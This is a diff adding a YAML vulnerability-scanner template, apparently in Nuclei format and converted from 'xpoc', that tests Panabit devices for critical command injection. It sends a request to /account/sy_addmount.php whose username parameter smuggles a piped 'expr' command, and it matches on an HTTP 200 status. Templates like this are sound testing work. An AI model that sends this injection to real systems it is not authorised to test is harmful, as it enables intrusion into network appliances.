@@ -1,0 +1,18 @@
+id: yaml-poc-panabit-panabit-other-CT-490513
+info:
+  name: Yaml Poc Panabit Panabit Other Ct 490513
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-panabit-panabit-other-CT-490513'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - /account/sy_addmount.php?username=|expr%20{{r1}}%20%2B%20{{r2}}
+  redirects: false
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
